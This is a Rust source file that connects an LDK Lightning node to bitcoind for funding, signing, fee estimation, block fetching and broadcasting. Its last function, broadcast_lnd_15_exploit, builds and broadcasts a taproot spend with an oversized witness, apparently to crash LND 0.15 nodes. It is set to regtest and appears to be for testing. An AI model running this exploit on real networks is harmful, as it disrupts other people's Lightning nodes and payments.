use bitcoin::blockdata::block::Block;
use bitcoin::blockdata::opcodes;
use bitcoin::blockdata::script::Builder;
use bitcoin::blockdata::transaction::Transaction;
use bitcoin::hash_types::BlockHash;
use bitcoin::hash_types::Txid;
use bitcoin::hashes::Hash;
use bitcoin::psbt::serialize::Serialize;
use bitcoin::schnorr::UntweakedPublicKey;
use bitcoin::secp256k1::Secp256k1;
use bitcoin::util::address::Address;
use bitcoin::util::taproot::{LeafVersion, TaprootBuilder};
use bitcoin::util::uint::Uint256;
use bitcoin::{Amount, Network, OutPoint, PackedLockTime, Script, Sequence, TxIn, TxOut, Witness};
use bitcoincore_rpc::bitcoincore_rpc_json::{EstimateMode, FundRawTransactionOptions};
use bitcoincore_rpc::Client;
use bitcoincore_rpc::RpcApi;
use hex;
use lightning::chain::chaininterface::{BroadcasterInterface, ConfirmationTarget, FeeEstimator};
use lightning_block_sync::{
    AsyncBlockSourceResult, BlockHeaderData, BlockSource, BlockSourceError,
};
use std::collections::HashMap;
use std::str::FromStr;
use std::sync::Arc;

pub struct FundedTx {
    pub changepos: i64,
    pub hex: String,
}

pub struct SignedTx {
    pub complete: bool,
    pub hex: String,
}

#[derive(Clone)]
pub struct LdkBitcoindClient {
    pub bitcoind_client: Arc<Client>,
}

impl LdkBitcoindClient {
    pub fn create_raw_transaction(&self, outputs: HashMap<String, Amount>) -> String {
        self.bitcoind_client
            .create_raw_transaction_hex(&vec![], &outputs, None, None)
            .unwrap()
    }

    pub fn fund_raw_transaction(&self, raw_tx: String) -> FundedTx {
        let options = FundRawTransactionOptions {
            fee_rate: Some(
                Amount::from_sat(
                    self.get_est_sat_per_1000_weight(ConfirmationTarget::Normal) as u64
                ), // used to divide by 250.0??
            ),
            replaceable: Some(false),
            ..Default::default()
        };

        let funded_tx = self
            .bitcoind_client
            .fund_raw_transaction(raw_tx, Some(&options), None)
            .unwrap();

        FundedTx {
            changepos: funded_tx.change_position as i64,
            hex: hex::encode(funded_tx.hex),
        }
    }

    pub fn sign_raw_transaction_with_wallet(&self, tx_hex: String) -> SignedTx {
        let signed_tx = self
            .bitcoind_client
            .sign_raw_transaction_with_wallet(tx_hex, None, None)
            .unwrap();

        SignedTx {
            complete: signed_tx.complete,
            hex: hex::encode(signed_tx.hex),
        }
    }

    pub fn get_new_address(&self, label: String) -> Result<Address, Box<dyn std::error::Error>> {
        // TODO utilize label, but for now not because polar...
        let label = String::from("");
        match self
            .bitcoind_client
            .get_new_address(Some(String::as_str(&label.clone())), None)
        {
            Ok(addr) => Ok(addr),
            Err(e) => Err(e.into()),
        }
    }

    pub fn create_wallet(&self, label: String) -> Result<(), Box<dyn std::error::Error>> {
        // TODO utilize label, but for now not because polar...
        let label = String::from("");
        match self.bitcoind_client.create_wallet(
            String::as_str(&label.clone()),
            None,
            None,
            None,
            None,
        ) {
            Ok(res) => {
                if let Some(warning) = res.warning {
                    if warning != "" {
                        return Err(warning.into());
                    } else {
                        Ok(())
                    }
                } else {
                    Ok(())
                }
            }
            Err(e) => Err(e.into()),
        }
    }
}

impl BlockSource for &LdkBitcoindClient {
    fn get_header<'a>(
        &'a self,
        header_hash: &'a BlockHash,
        _height_hint: Option<u32>,
    ) -> AsyncBlockSourceResult<'a, BlockHeaderData> {
        Box::pin(async move {
            let res = self.bitcoind_client.get_block_header_info(header_hash);
            match res {
                Ok(res) => {
                    let converted_res = BlockHeaderData {
                        header: bitcoin::BlockHeader {
                            version: res.version,
                            prev_blockhash: res.previous_block_hash.unwrap(),
                            merkle_root: res.merkle_root,
                            time: res.time as u32,
                            bits: u32::from_str_radix(&res.bits, 16).unwrap(),
                            nonce: res.nonce,
                        },
                        height: res.height as u32,
                        chainwork: Uint256::from_be_bytes(res.chainwork.try_into().unwrap()),
                    };
                    Ok(converted_res)
                }
                // TODO verify error type
                Err(e) => Err(BlockSourceError::transient(e)),
            }
        })
    }

    fn get_block<'a>(&'a self, header_hash: &'a BlockHash) -> AsyncBlockSourceResult<'a, Block> {
        Box::pin(async move {
            let res = self.bitcoind_client.get_block(header_hash);
            match res {
                Ok(res) => Ok(res),
                // TODO verify error type
                Err(e) => Err(BlockSourceError::transient(e)),
            }
        })
    }

    fn get_best_block<'a>(&'a self) -> AsyncBlockSourceResult<(BlockHash, Option<u32>)> {
        Box::pin(async move {
            let res = self.bitcoind_client.get_blockchain_info();
            match res {
                Ok(res) => Ok((res.best_block_hash, Some(res.blocks as u32))),
                // TODO verify error type
                Err(e) => Err(BlockSourceError::transient(e)),
            }
        })
    }
}

const MIN_FEERATE: u32 = 253 * 4;

impl FeeEstimator for LdkBitcoindClient {
    fn get_est_sat_per_1000_weight(&self, confirmation_target: ConfirmationTarget) -> u32 {
        match confirmation_target {
            ConfirmationTarget::Background => {
                let res = self
                    .bitcoind_client
                    .estimate_smart_fee(144, Some(EstimateMode::Economical));
                match res {
                    Ok(res) => {
                        if let Some(fee_rate) = res.fee_rate {
                            std::cmp::max(MIN_FEERATE, (fee_rate.to_sat()) as u32)
                        } else {
                            MIN_FEERATE
                        }
                    }
                    Err(_) => MIN_FEERATE,
                }
            }
            ConfirmationTarget::Normal => {
                let res = self
                    .bitcoind_client
                    .estimate_smart_fee(18, Some(EstimateMode::Conservative));
                match res {
                    Ok(res) => {
                        if let Some(fee_rate) = res.fee_rate {
                            std::cmp::max(MIN_FEERATE, (fee_rate.to_sat()) as u32)
                        } else {
                            // TODO probably not min for normal
                            MIN_FEERATE
                        }
                    }
                    // TODO probably not min for normal
                    Err(_) => MIN_FEERATE,
                }
            }
            ConfirmationTarget::HighPriority => {
                let res = self
                    .bitcoind_client
                    .estimate_smart_fee(6, Some(EstimateMode::Conservative));
                match res {
                    Ok(res) => {
                        if let Some(fee_rate) = res.fee_rate {
                            std::cmp::max(MIN_FEERATE, (fee_rate.to_sat()) as u32)
                        } else {
                            // TODO probably not min for high
                            MIN_FEERATE
                        }
                    }
                    // TODO probably not min for high
                    Err(_) => MIN_FEERATE,
                }
            }
        }
    }
}

impl BroadcasterInterface for LdkBitcoindClient {
    fn broadcast_transaction(&self, tx: &Transaction) {
        let res = self.bitcoind_client.send_raw_transaction(tx);
        // This may error due to RL calling `broadcast_transaction` with the same transaction
        // multiple times, but the error is safe to ignore.
        match res {
            Ok(_) => {}
            Err(e) => {
                let err_str = e.to_string();
                if !err_str.contains("Transaction already in block chain")
                    && !err_str.contains("Inputs missing or spent")
                    && !err_str.contains("bad-txns-inputs-missingorspent")
                    && !err_str.contains("txn-mempool-conflict")
                    && !err_str.contains("non-BIP68-final")
                    && !err_str.contains("insufficient fee, rejecting replacement ")
                {
                    panic!("{}", e);
                }
            }
        }
    }
}

pub fn broadcast_lnd_15_exploit(
    bitcoind_client: Arc<Client>,
) -> Result<String, Box<dyn std::error::Error>> {
    // TODO generate tweaked public key
    let secp = Secp256k1::new();
    let internal_key = UntweakedPublicKey::from_str(
        "93c7378d96518a75448821c4f7c8f4bae7ce60f804d03d1f0628dd5dd0f5de51",
    )
    .unwrap();

    let script_builder = (0..25).into_iter().fold(Builder::new(), |b, _| {
        b.push_slice(&vec![1; 520])
            .push_opcode(opcodes::all::OP_DROP)
    });
    let script = script_builder.push_opcode(opcodes::OP_TRUE).into_script();
    let tr_script = script.clone().to_v1_p2tr(&secp, internal_key);
    let addr = Address::from_script(&tr_script, Network::Regtest).unwrap();

    let txid = bitcoind_client.send_to_address(
        &addr,
        Amount::from_sat(110000), // TODO configure amount
        None,
        None,
        None,
        None,
        None,
        None,
    )?;

    // find which output was used to fund the address
    let get_tx_out_result = bitcoind_client.get_tx_out(&txid, 0, Some(true))?;
    let is_vout_0_opt = get_tx_out_result.map(|r| r.script_pub_key.hex == tr_script.serialize());
    let is_vout_0 = is_vout_0_opt.unwrap_or(false);
    let vout = if is_vout_0 { 0 } else { 1 };

    // create taproot tree
    let tr = TaprootBuilder::new().add_leaf(0, script.clone()).unwrap();
    let spend_info = tr.finalize(&secp, internal_key).unwrap();
    // create control block
    let control_block = spend_info
        .control_block(&(script.clone(), LeafVersion::TapScript))
        .unwrap();
    // witness is spending script followed by control block
    let witness = vec![script.serialize(), control_block.serialize()];

    let txin = TxIn {
        previous_output: OutPoint { txid, vout },
        script_sig: Script::new(),
        sequence: Sequence::ZERO,
        witness: Witness::from_vec(witness),
    };

    let created_tx = Transaction {
        version: 2,
        lock_time: PackedLockTime::ZERO,
        input: vec![txin],
        output: vec![TxOut {
            value: 10_000, // TODO configure amount
            script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
        }],
    };

    match bitcoind_client.send_raw_transaction(&created_tx) {
        Ok(txid) => Ok(txid.to_string()),
        Err(e) => Err(e.into()),
    }
}
